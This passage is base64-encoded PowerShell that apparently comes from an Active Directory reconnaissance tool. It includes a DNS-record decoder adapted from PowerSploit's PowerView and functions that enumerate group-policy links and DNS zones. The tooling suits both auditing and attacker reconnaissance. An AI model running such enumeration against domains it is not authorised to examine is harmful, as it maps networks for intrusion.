b3VwUG9saWN5Q29udGFpbmVyKSIKICAgICAgICAkT2JqU2VhcmNoZXIuU2VhcmNoU2NvcGUgPSAiU3VidHJlZSIKCiAgICAgICAgVHJ5CiAgICAgICAgewogICAgICAgICAgICAkQURHUE9zID0gJE9ialNlYXJjaGVyLkZpbmRBbGwoKQogICAgICAgIH0KICAgICAgICBDYXRjaAogICAgICAgIHsKICAgICAgICAgICAgV3JpdGUtV2FybmluZyAiW0dldC1BRFJHUExpbmtdIEVycm9yIHdoaWxlIGVudW1lcmF0aW5nIGdyb3VwUG9saWN5Q29udGFpbmVyIE9iamVjdHMiCiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltFWENFUFRJT05dICQoJF8uRXhjZXB0aW9uLk1lc3NhZ2UpIgogICAgICAgICAgICBSZXR1cm4gJG51bGwKICAgICAgICB9CiAgICAgICAgJE9ialNlYXJjaGVyLmRpc3Bvc2UoKQoKICAgICAgICBJZiAoICgkQURTT01zKSAtYW5kICgkQURHUE9zKSApCiAgICAgICAgewogICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbKl0gVG90YWwgU09NczogJChbQURSZWNvbi5MREFQQ2xhc3NdOjpPYmplY3RDb3VudCgkQURTT01zKSkiCiAgICAgICAgICAgICRTT01PYmogPSBbQURSZWNvbi5MREFQQ2xhc3NdOjpTT01QYXJzZXIoJEFER1BPcywgJEFEU09NcywgJFRocmVhZHMpCiAgICAgICAgICAgIFJlbW92ZS1WYXJpYWJsZSBBRFNPTXMKICAgICAgICAgICAgUmVtb3ZlLVZhcmlhYmxlIEFER1BPcwogICAgICAgIH0KICAgIH0KCiAgICBJZiAoJFNPTU9iaikKICAgIHsKICAgICAgICBSZXR1cm4gJFNPTU9iagogICAgfQogICAgRWxzZQogICAgewogICAgICAgIFJldHVybiAkbnVsbAogICAgfQp9CgojIE1vZGlmaWVkIENvbnZlcnQtRE5TUmVjb3JkIGZ1bmN0aW9uIGZyb20gaHR0cHM6Ly9naXRodWIuY29tL1Bvd2VyU2hlbGxNYWZpYS9Qb3dlclNwbG9pdC9ibG9iL2Rldi9SZWNvbi9Qb3dlclZpZXcucHMxCkZ1bmN0aW9uIENvbnZlcnQtRE5TUmVjb3JkCnsKPCMKLlNZTk9QU0lTCgpIZWxwZXJzIHRoYXQgZGVjb2RlcyBhIGJpbmFyeSBETlMgcmVjb3JkIGJsb2IuCgpBdXRob3I6IE1pY2hhZWwgQi4gU21pdGgsIFdpbGwgU2Nocm9lZGVyIChAaGFybWoweSkKTGljZW5zZTogQlNEIDMtQ2xhdXNlClJlcXVpcmVkIERlcGVuZGVuY2llczogTm9uZQoKLkRFU0NSSVBUSU9OCgpEZWNvZGVzIGEgYmluYXJ5IGJsb2IgcmVwcmVzZW50aW5nIGFuIEFjdGl2ZSBEaXJlY3RvcnkgRE5TIGVudHJ5LgpVc2VkIGJ5IEdldC1Eb21haW5ETlNSZWNvcmQuCgpBZGFwdGVkL3BvcnRlZCBmcm9tIE1pY2hhZWwgQi4gU21pdGgncyBjb2RlIGF0IGh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9tbWVzc2Fuby9Qb3dlclNoZWxsL21hc3Rlci9kbnMtZHVtcC5wczEKCi5QQVJBTUVURVIgRE5TUmVjb3JkCgpBIGJ5dGUgYXJyYXkgcmVwcmVzZW50aW5nIHRoZSBETlMgcmVjb3JkLgoKLk9VVFBVVFMKClN5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDdXN0b21PYmplY3QKCk91dHB1dHMgY3VzdG9tIFBTT2JqZWN0cyB3aXRoIGRldGFpbGVkIGluZm9ybWF0aW9uIGFib3V0IHRoZSBETlMgcmVjb3JkIGVudHJ5LgoKLkxJTksKCmh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9tbWVzc2Fuby9Qb3dlclNoZWxsL21hc3Rlci9kbnMtZHVtcC5wczEKIz4KCiAgICBbT3V0cHV0VHlwZSgnU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0N1c3RvbU9iamVjdCcpXQogICAgW0NtZGxldEJpbmRpbmcoKV0KICAgIFBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBNYW5kYXRvcnkgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZSA9ICRUcnVlKV0KICAgICAgICBbQnl0ZVtdXQogICAgICAgICRETlNSZWNvcmQKICAgICkKCiAgICBCRUdJTiB7CiAgICAgICAgRnVuY3Rpb24gR2V0LU5hbWUKICAgICAgICB7CiAgICAgICAgICAgIFtEaWFnbm9zdGljcy5Db2RlQW5hbHlzaXMuU3VwcHJlc3NNZXNzYWdlQXR0cmlidXRlKCdQU1VzZU91dHB1dFR5cGVDb3JyZWN0bHknLCAnJyldCiAgICAgICAgICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICAgICAgICAgIFBhcmFtKAogICAgICAgICAgICAgICAgW0J5dGVbXV0KICAgICAgICAgICAgICAgICRSYXcKICAgICAgICAgICAgKQoKICAgICAgICAgICAgW0ludF0kTGVuZ3RoID0gJFJhd1swXQogICAgICAgICAgICBbSW50XSRTZWdtZW50cyA9ICRSYXdbMV0KICAgICAgICAgICAgW0ludF0kSW5kZXggPSAgMgogICAgICAgICAgICBbU3RyaW5nXSROYW1lICA9ICcnCgogICAgICAgICAgICB3aGlsZSAoJFNlZ21lbnRzLS0gLWd0IDApCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIFtJbnRdJFNlZ21lbnRMZW5ndGggPSAkUmF3WyRJbmRleCsrXQogICAgICAgICAgICAgICAgd2hpbGUgKCRTZWdtZW50TGVuZ3RoLS0gLWd0IDApCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgJE5hbWUgKz0gW0NoYXJdJFJhd1skSW5kZXgrK10KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICROYW1lICs9ICIuIgogICAgICAgICAgICB9CiAgICAgICAgICAgICROYW1lCiAgICAgICAgfQogICAgfQoKICAgIFBST0NFU1MKICAgIHsKICAgICAgICAjICRSRGF0YUxlbiA9IFtCaXRDb252ZXJ0ZXJdOjpUb1VJbnQxNigkRE5TUmVjb3JkLCAwKQogICAgICAgICRSRGF0YVR5cGUgPSBbQml0Q29udmVydGVyXTo6VG9VSW50MTYoJEROU1JlY29yZCwgMikKICAgICAgICAkVXBkYXRlZEF0U2VyaWFsID0gW0JpdENvbnZlcnRlcl06OlRvVUludDMyKCRETlNSZWNvcmQsIDgpCgogICAgICAgICRUVExSYXcgPSAkRE5TUmVjb3JkWzEyLi4xNV0KCiAgICAgICAgIyByZXZlcnNlIGZvciBiaWcgZW5kaWFuCiAgICAgICAgJE51bGwgPSBbYXJyYXldOjpSZXZlcnNlKCRUVExSYXcpCiAgICAgICAgJFRUTCA9IFtCaXRDb252ZXJ0ZXJdOjpUb1VJbnQzMigkVFRMUmF3LCAwKQoKICAgICAgICAkQWdlID0gW0JpdENvbnZlcnRlcl06OlRvVUludDMyKCRETlNSZWNvcmQsIDIwKQogICAgICAgIElmICgkQWdlIC1uZSAwKQogICAgICAgIHsKICAgICAgICAgICAgJFRpbWVTdGFtcCA9ICgoR2V0LURhdGUgLVllYXIgMTYwMSAtTW9udGggMSAtRGF5IDEgLUhvdXIgMCAtTWludXRlIDAgLVNlY29uZCAwKS5BZGRIb3VycygkYWdlKSkuVG9TdHJpbmcoKQogICAgICAgIH0KICAgICAgICBFbHNlCiAgICAgICAgewogICAgICAgICAgICAkVGltZVN0YW1wID0gJ1tzdGF0aWNdJwogICAgICAgIH0KCiAgICAgICAgJEROU1JlY29yZE9iamVjdCA9IE5ldy1PYmplY3QgUFNPYmplY3QKCiAgICAgICAgc3dpdGNoICgkUkRhdGFUeXBlKQogICAgICAgIHsKICAgICAgICAgICAgMQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkSVAgPSAiezB9LnsxfS57Mn0uezN9IiAtZiAkRE5TUmVjb3JkWzI0XSwgJEROU1JlY29yZFsyNV0sICRETlNSZWNvcmRbMjZdLCAkRE5TUmVjb3JkWzI3XQogICAgICAgICAgICAgICAgJERhdGEgPSAkSVAKICAgICAgICAgICAgICAgICRETlNSZWNvcmRPYmplY3QgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnUmVjb3JkVHlwZScgJ0EnCiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIDIKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJE5TTmFtZSA9IEdldC1OYW1lICRETlNSZWNvcmRbMjQuLiRETlNSZWNvcmQubGVuZ3RoXQogICAgICAgICAgICAgICAgJERhdGEgPSAkTlNOYW1lCiAgICAgICAgICAgICAgICAkRE5TUmVjb3JkT2JqZWN0IHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ1JlY29yZFR5cGUnICdOUycKICAgICAgICAgICAgfQoKICAgICAgICAgICAgNQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkQWxpYXMgPSBHZXQtTmFtZSAkRE5TUmVjb3JkWzI0Li4kRE5TUmVjb3JkLmxlbmd0aF0KICAgICAgICAgICAgICAgICREYXRhID0gJEFsaWFzCiAgICAgICAgICAgICAgICAkRE5TUmVjb3JkT2JqZWN0IHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ1JlY29yZFR5cGUnICdDTkFNRScKICAgICAgICAgICAgfQoKICAgICAgICAgICAgNgogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkUHJpbWFyeU5TID0gR2V0LU5hbWUgJEROU1JlY29yZFs0NC4uJEROU1JlY29yZC5sZW5ndGhdCiAgICAgICAgICAgICAgICAkUmVzcG9uc2libGVQYXJ0eSA9IEdldC1OYW1lICRETlNSZWNvcmRbJCg0NiskRE5TUmVjb3JkWzQ0XSkuLiRETlNSZWNvcmQubGVuZ3RoXQogICAgICAgICAgICAgICAgJFNlcmlhbFJhdyA9ICRETlNSZWNvcmRbMjQuLjI3XQogICAgICAgICAgICAgICAgIyByZXZlcnNlIGZvciBiaWcgZW5kaWFuCiAgICAgICAgICAgICAgICAkTnVsbCA9IFthcnJheV06OlJldmVyc2UoJFNlcmlhbFJhdykKICAgICAgICAgICAgICAgICRTZXJpYWwgPSBbQml0Q29udmVydGVyXTo6VG9VSW50MzIoJFNlcmlhbFJhdywgMCkKCiAgICAgICAgICAgICAgICAkUmVmcmVzaFJhdyA9ICRETlNSZWNvcmRbMjguLjMxXQogICAgICAgICAgICAgICAgJE51bGwgPSBbYXJyYXldOjpSZXZlcnNlKCRSZWZyZXNoUmF3KQogICAgICAgICAgICAgICAgJFJlZnJlc2ggPSBbQml0Q29udmVydGVyXTo6VG9VSW50MzIoJFJlZnJlc2hSYXcsIDApCgogICAgICAgICAgICAgICAgJFJldHJ5UmF3ID0gJEROU1JlY29yZFszMi4uMzVdCiAgICAgICAgICAgICAgICAkTnVsbCA9IFthcnJheV06OlJldmVyc2UoJFJldHJ5UmF3KQogICAgICAgICAgICAgICAgJFJldHJ5ID0gW0JpdENvbnZlcnRlcl06OlRvVUludDMyKCRSZXRyeVJhdywgMCkKCiAgICAgICAgICAgICAgICAkRXhwaXJlc1JhdyA9ICRETlNSZWNvcmRbMzYuLjM5XQogICAgICAgICAgICAgICAgJE51bGwgPSBbYXJyYXldOjpSZXZlcnNlKCRFeHBpcmVzUmF3KQogICAgICAgICAgICAgICAgJEV4cGlyZXMgPSBbQml0Q29udmVydGVyXTo6VG9VSW50MzIoJEV4cGlyZXNSYXcsIDApCgogICAgICAgICAgICAgICAgJE1pblRUTFJhdyA9ICRETlNSZWNvcmRbNDAuLjQzXQogICAgICAgICAgICAgICAgJE51bGwgPSBbYXJyYXldOjpSZXZlcnNlKCRNaW5UVExSYXcpCiAgICAgICAgICAgICAgICAkTWluVFRMID0gW0JpdENvbnZlcnRlcl06OlRvVUludDMyKCRNaW5UVExSYXcsIDApCgogICAgICAgICAgICAgICAgJERhdGEgPSAiWyIgKyAkU2VyaWFsICsgIl1bIiArICRQcmltYXJ5TlMgKyAiXVsiICsgJFJlc3BvbnNpYmxlUGFydHkgKyAiXVsiICsgJFJlZnJlc2ggKyAiXVsiICsgJFJldHJ5ICsgIl1bIiArICRFeHBpcmVzICsgIl1bIiArICRNaW5UVEwgKyAiXSIKICAgICAgICAgICAgICAgICRETlNSZWNvcmRPYmplY3QgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnUmVjb3JkVHlwZScgJ1NPQScKICAgICAgICAgICAgfQoKICAgICAgICAgICAgMTIKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJFB0ciA9IEdldC1OYW1lICRETlNSZWNvcmRbMjQuLiRETlNSZWNvcmQubGVuZ3RoXQogICAgICAgICAgICAgICAgJERhdGEgPSAkUHRyCiAgICAgICAgICAgICAgICAkRE5TUmVjb3JkT2JqZWN0IHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ1JlY29yZFR5cGUnICdQVFInCiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIDEzCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIFtzdHJpbmddJENQVVR5cGUgPSAiIgogICAgICAgICAgICAgICAgW3N0cmluZ10kT1NUeXBlICA9ICIiCiAgICAgICAgICAgICAgICBbaW50XSRTZWdtZW50TGVuZ3RoID0gJEROU1JlY29yZFsyNF0KICAgICAgICAgICAgICAgICRJbmRleCA9IDI1CiAgICAgICAgICAgICAgICB3aGlsZSAoJFNlZ21lbnRMZW5ndGgtLSAtZ3QgMCkKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAkQ1BVVHlwZSArPSBbY2hhcl0kRE5TUmVjb3JkWyRJbmRleCsrXQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgJEluZGV4ID0gMjQgKyAkRE5TUmVjb3JkWzI0XSArIDEKICAgICAgICAgICAgICAgIFtpbnRdJFNlZ21lbnRMZW5ndGggPSAkSW5kZXgrKwogICAgICAgICAgICAgICAgd2hpbGUgKCRTZWdtZW50TGVuZ3RoLS0gLWd0IDApCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgJE9TVHlwZSArPSBbY2hhcl0kRE5TUmVjb3JkWyRJbmRleCsrXQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgJERhdGEgPSAiWyIgKyAkQ1BVVHlwZSArICJdWyIgKyAkT1NUeXBlICsgIl0iCiAgICAgICAgICAgICAgICAkRE5TUmVjb3JkT2JqZWN0IHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ1JlY29yZFR5cGUnICdISU5GTycKICAgICAgICAgICAgfQoKICAgICAgICAgICAgMTUKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJFByaW9yaXR5UmF3ID0gJEROU1JlY29yZFsyNC4uMjVdCiAgICAgICAgICAgICAgICAjIHJldmVyc2UgZm9yIGJpZyBlbmRpYW4KICAgICAgICAgICAgICAgICROdWxsID0gW2FycmF5XTo6UmV2ZXJzZSgkUHJpb3JpdHlSYXcpCiAgICAgICAgICAgICAgICAkUHJpb3JpdHkgPSBbQml0Q29udmVydGVyXTo6VG9VSW50MTYoJFByaW9yaXR5UmF3LCAwKQogICAgICAgICAgICAgICAgJE1YSG9zdCAgID0gR2V0LU5hbWUgJEROU1JlY29yZFsyNi4uJEROU1JlY29yZC5sZW5ndGhdCiAgICAgICAgICAgICAgICAkRGF0YSA9ICJbIiArICRQcmlvcml0eSArICJdWyIgKyAkTVhIb3N0ICsgIl0iCiAgICAgICAgICAgICAgICAkRE5TUmVjb3JkT2JqZWN0IHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ1JlY29yZFR5cGUnICdNWCcKICAgICAgICAgICAgfQoKICAgICAgICAgICAgMTYKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgW3N0cmluZ10kVFhUICA9ICcnCiAgICAgICAgICAgICAgICBbaW50XSRTZWdtZW50TGVuZ3RoID0gJEROU1JlY29yZFsyNF0KICAgICAgICAgICAgICAgICRJbmRleCA9IDI1CiAgICAgICAgICAgICAgICB3aGlsZSAoJFNlZ21lbnRMZW5ndGgtLSAtZ3QgMCkKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAkVFhUICs9IFtjaGFyXSRETlNSZWNvcmRbJEluZGV4KytdCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAkRGF0YSA9ICRUWFQKICAgICAgICAgICAgICAgICRETlNSZWNvcmRPYmplY3QgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnUmVjb3JkVHlwZScgJ1RYVCcKICAgICAgICAgICAgfQoKICAgICAgICAgICAgMjgKICAgICAgICAgICAgewogICAgICAgIAkJIyMjIHllYWgsIHRoaXMgZG9lc24ndCBkbyBhbGwgdGhlIGZhbmN5IGZvcm1hdHRpbmcgdGhhdCBjYW4gYmUgZG9uZSBmb3IgSVB2NgogICAgICAgICAgICAgICAgJEFBQUEgPSAiIgogICAgICAgICAgICAgICAgZm9yICgkaSA9IDI0OyAkaSAtbHQgNDA7ICRpKz0yKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICRCbG9ja1JhdyA9ICRETlNSZWNvcmRbJGkuLiQoJGkrMSldCiAgICAgICAgICAgICAgICAgICAgIyByZXZlcnNlIGZvciBiaWcgZW5kaWFuCiAgICAgICAgICAgICAgICAgICAgJE51bGwgPSBbYXJyYXldOjpSZXZlcnNlKCRCbG9ja1JhdykKICAgICAgICAgICAgICAgICAgICAkQmxvY2sgPSBbQml0Q29udmVydGVyXTo6VG9VSW50MTYoJEJsb2NrUmF3LCAwKQoJCQkgICAgICAgICRBQUFBICs9ICgkQmxvY2spLlRvU3RyaW5nKCd4NCcpCgkJCSAgICAgICAgSWYgKCRpIC1uZSAzOCkKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICRBQUFBICs9ICc6JwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICREYXRhID0gJEFBQUEKICAgICAgICAgICAgICAgICRETlNSZWNvcmRPYmplY3QgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnUmVjb3JkVHlwZScgJ0FBQUEnCiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIDMzCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRQcmlvcml0eVJhdyA9ICRETlNSZWNvcmRbMjQuLjI1XQogICAgICAgICAgICAgICAgIyByZXZlcnNlIGZvciBiaWcgZW5kaWFuCiAgICAgICAgICAgICAgICAkTnVsbCA9IFthcnJheV06OlJldmVyc2UoJFByaW9yaXR5UmF3KQogICAgICAgICAgICAgICAgJFByaW9yaXR5ID0gW0JpdENvbnZlcnRlcl06OlRvVUludDE2KCRQcmlvcml0eVJhdywgMCkKCiAgICAgICAgICAgICAgICAkV2VpZ2h0UmF3ID0gJEROU1JlY29yZFsyNi4uMjddCiAgICAgICAgICAgICAgICAkTnVsbCA9IFthcnJheV06OlJldmVyc2UoJFdlaWdodFJhdykKICAgICAgICAgICAgICAgICRXZWlnaHQgPSBbQml0Q29udmVydGVyXTo6VG9VSW50MTYoJFdlaWdodFJhdywgMCkKCiAgICAgICAgICAgICAgICAkUG9ydFJhdyA9ICRETlNSZWNvcmRbMjguLjI5XQogICAgICAgICAgICAgICAgJE51bGwgPSBbYXJyYXldOjpSZXZlcnNlKCRQb3J0UmF3KQogICAgICAgICAgICAgICAgJFBvcnQgPSBbQml0Q29udmVydGVyXTo6VG9VSW50MTYoJFBvcnRSYXcsIDApCgogICAgICAgICAgICAgICAgJFNSVkhvc3QgPSBHZXQtTmFtZSAkRE5TUmVjb3JkWzMwLi4kRE5TUmVjb3JkLmxlbmd0aF0KICAgICAgICAgICAgICAgICREYXRhID0gIlsiICsgJFByaW9yaXR5ICsgIl1bIiArICRXZWlnaHQgKyAiXVsiICsgJFBvcnQgKyAiXVsiICsgJFNSVkhvc3QgKyAiXSIKICAgICAgICAgICAgICAgICRETlNSZWNvcmRPYmplY3QgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnUmVjb3JkVHlwZScgJ1NSVicKICAgICAgICAgICAgfQoKICAgICAgICAgICAgZGVmYXVsdAogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkRGF0YSA9ICQoW1N5c3RlbS5Db252ZXJ0XTo6VG9CYXNlNjRTdHJpbmcoJEROU1JlY29yZFsyNC4uJEROU1JlY29yZC5sZW5ndGhdKSkKICAgICAgICAgICAgICAgICRETlNSZWNvcmRPYmplY3QgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnUmVjb3JkVHlwZScgJ1VOS05PV04nCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgJEROU1JlY29yZE9iamVjdCB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdVcGRhdGVkQXRTZXJpYWwnICRVcGRhdGVkQXRTZXJpYWwKICAgICAgICAkRE5TUmVjb3JkT2JqZWN0IHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ1RUTCcgJFRUTAogICAgICAgICRETlNSZWNvcmRPYmplY3QgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnQWdlJyAkQWdlCiAgICAgICAgJEROU1JlY29yZE9iamVjdCB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdUaW1lU3RhbXAnICRUaW1lU3RhbXAKICAgICAgICAkRE5TUmVjb3JkT2JqZWN0IHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0RhdGEnICREYXRhCiAgICAgICAgUmV0dXJuICRETlNSZWNvcmRPYmplY3QKICAgIH0KfQoKRnVuY3Rpb24gR2V0LUFEUkROU1pvbmUKewo8IwouU1lOT1BTSVMKICAgIFJldHVybnMgYWxsIEROUyBab25lcyBhbmQgUmVjb3JkcyBpbiB0aGUgY3VycmVudCAob3Igc3BlY2lmaWVkKSBkb21haW4uCgouREVTQ1JJUFRJT04KICAgIFJldHVybnMgYWxsIEROUyBab25lcyBhbmQgUmVjb3JkcyBpbiB0aGUgY3VycmVudCAob3Igc3BlY2lmaWVkKSBkb21haW4uCgouUEFSQU1FVEVSIFByb3RvY29sCiAgICBbc3RyaW5nXQogICAgV2hpY2ggcHJvdG9jb2wgdG8gdXNlOyBBRFdTIChkZWZhdWx0KSBvciBMREFQLgoKLlBBUkFNRVRFUiBBRFJPdXRwdXREaXIKICAgIFtzdHJpbmddCiAgICBQYXRoIGZvciBBRFJlY29uIG91dHB1dCBmb2xkZXIuCgouUEFSQU1FVEVSIG9iakRvbWFpbgogICAgW0RpcmVjdG9yeVNlcnZpY2VzLkRpcmVjdG9yeUVudHJ5XQogICAgRG9tYWluIERpcmVjdG9yeSBFbnRyeSBvYmplY3QuCgouUEFSQU1FVEVSIERvbWFpbkNvbnRyb2xsZXIKICAgIFtzdHJpbmddCiAgICBJUCBBZGRyZXNzIG9mIHRoZSBEb21haW4gQ29udHJvbGxlci4KCi5QQVJBTUVURVIgQ3JlZGVudGlhbAogICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdCiAgICBDcmVkZW50aWFscy4KCi5QQVJBTUVURVIgUGFnZVNpemUKICAgIFtpbnRdCiAgICBUaGUgUGFnZVNpemUgdG8gc2V0IGZvciB0aGUgTERBUCBzZWFyY2hlciBvYmplY3QuIERlZmF1bHQgMjAwLgoKLlBBUkFNRVRFUiBPdXRwdXRUeXBlCiAgICBbYXJyYXldCiAgICBPdXRwdXQgVHlwZS4KCi5PVVRQVVRTCiAgICBDU1YgZmlsZXMgYXJlIGNyZWF0ZWQgaW4gdGhlIGZvbGRlciBzcGVjaWZpZWQgd2l0aCB0aGUgaW5mb3JtYXRpb24uCiM+CiAgICBwYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9ICR0cnVlKV0KICAgICAgICBbc3RyaW5nXSAkUHJvdG9jb2wsCgogICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJHRydWUpXQogICAgICAgIFtzdHJpbmddICRBRFJPdXRwdXREaXIsCgogICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJGZhbHNlKV0KICAgICAgICBbRGlyZWN0b3J5U2VydmljZXMuRGlyZWN0b3J5RW50cnldICRvYmpEb21haW4sCgogICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJGZhbHNlKV0KICAgICAgICBbc3RyaW5nXSAkRG9tYWluQ29udHJvbGxlciwKCiAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkZmFsc2UpXQogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXSAkQ3JlZGVudGlhbCA9IFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXTo6RW1wdHksCgogICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJHRydWUpXQogICAgICAgIFtpbnRdICRQYWdlU2l6ZSwKCiAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkdHJ1ZSldCiAgICAgICAgW2FycmF5XSAkT3V0cHV0VHlwZQogICAgKQoKICAgIElmICgkUHJvdG9jb2wgLWVxICdBRFdTJykKICAgIHsKICAgICAgICBUcnkKICAgICAgICB7CiAgICAgICAgICAgICRBREROU1pvbmVzID0gR2V0LUFET2JqZWN0IC1MREFQRmlsdGVyICcob2JqZWN0Q2xhc3M9ZG5zWm9uZSknIC1Qcm9wZXJ0aWVzIE5hbWUsd2hlbkNyZWF0ZWQsd2hlbkNoYW5nZWQsdXNuY3JlYXRlZCx1c25jaGFuZ2VkLGRpc3Rpbmd1aXNoZWRuYW1lCiAgICAgICAgfQogICAgICAgIENhdGNoCiAgICAgICAgewogICAgICAgICAgICBXcml0ZS1XYXJuaW5nICJbR2V0LUFEUkROU1pvbmVdIEVycm9yIHdoaWxlIGVudW1lcmF0aW5nIGRuc1pvbmUgT2JqZWN0cyIKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0VYQ0VQVElPTl0gJCgkXy5FeGNlcHRpb24uTWVzc2FnZSkiCiAgICAgICAgfQoKICAgICAgICAkRE5TWm9uZUFycmF5ID0gQCgpCiAgICAgICAgSWYgKCRBREROU1pvbmVzKQogICAgICAgIHsKICAgICAgICAgICAgJEROU1pvbmVBcnJheSArPSAkQURETlNab25lcwogICAgICAgICAgICBSZW1vdmUtVmFyaWFibGUgQURETlNab25lcwogICAgICAgIH0KCiAgICAgICAgVHJ5CiAgICAgICAgewogICAgICAgICAgICAkQURETlNab25lczEgPSBHZXQtQURPYmplY3QgLUxEQVBGaWx0ZXIgJyhvYmplY3RDbGFzcz1kbnNab25lKScgLVNlYXJjaEJhc2UgIkRDPURvbWFpbkRuc1pvbmVzLCQoKEdldC1BRERvbWFpbikuRGlzdGluZ3Vpc2hlZE5hbWUpIiAtUHJvcGVydGllcyBOYW1lLHdoZW5DcmVhdGVkLHdoZW5DaGFuZ2VkLHVzbmNyZWF0ZWQsdXNuY2hhbmdlZCxkaXN0aW5ndWlzaGVkbmFtZQogICAgICAgIH0KICAgICAgICBDYXRjaAogICAgICAgIHsKICAgICAgICAgICAgV3JpdGUtV2FybmluZyAiW0dldC1BRFJETlNab25lXSBFcnJvciB3aGlsZSBlbnVtZXJhdGluZyBEb21haW5EbnNab25lcyBkbnNab25lIE9iamVjdHMiCiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltFWENFUFRJT05dICQoJF8uRXhjZXB0aW9uLk1lc3NhZ2UpIgogICAgICAgIH0KICAgICAgICBJZiAoJEFERE5TWm9uZXMxKQogICAgICAgIHsKICAgICAgICAgICAgJEROU1pvbmVBcnJheSArPSAkQURETlNab25lczEKICAgICAgICAgICAgUmVtb3ZlLVZhcmlhYmxlIEFERE5TWm9uZXMxCiAgICAgICAgfQoKICAgICAgICBUcnkKICAgICAgICB7CiAgICAgICAgICAgICRBREROU1pvbmVzMiA9IEdldC1BRE9iamVjdCAtTERBUEZpbHRlciAnKG9iamVjdENsYXNzPWRuc1pvbmUpJyAtU2VhcmNoQmFzZSAiREM9Rm9yZXN0RG5zWm9uZXMsJCgoR2V0LUFERG9tYWluKS5EaXN0aW5ndWlzaGVkTmFtZSkiIC1Qcm9wZXJ0aWVzIE5hbWUsd2hlbkNyZWF0ZWQsd2hlbkNoYW5nZWQsdXNuY3JlYXRlZCx1c25jaGFuZ2VkLGRpc3Rpbmd1aXNoZWRuYW1lCiAgICAgICAgfQogICAgICAgIENhdGNoCiAgICAgICAgewogICAgICAgICAgICBXcml0ZS1XYXJuaW5nICJbR2V0LUFEUkROU1pvbmVdIEVycm9yIHdoaWxlIGVudW1lcmF0aW5nIERDPUZvcmVzdERuc1pvbmVzLCQoKEdldC1BRERvbWFpbikuRGlzdGluZ3Vpc2hlZE5hbWUpIGRuc1pvbmUgT2JqZWN0cyIKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0VYQ0VQVElPTl0gJCgkXy5FeGNlcHRpb24uTWVzc2FnZSkiCiAgICAgICAgfQogICAgICAgIElmICgkQURETlNab25lczIpCiAgICAgICAgewogICAgICAgICAgICAkRE5TWm9uZUFycmF5ICs9ICRBREROU1pvbmVzMgogICAgICAgICAgICBSZW1vdmUtVmFyaWFibGUg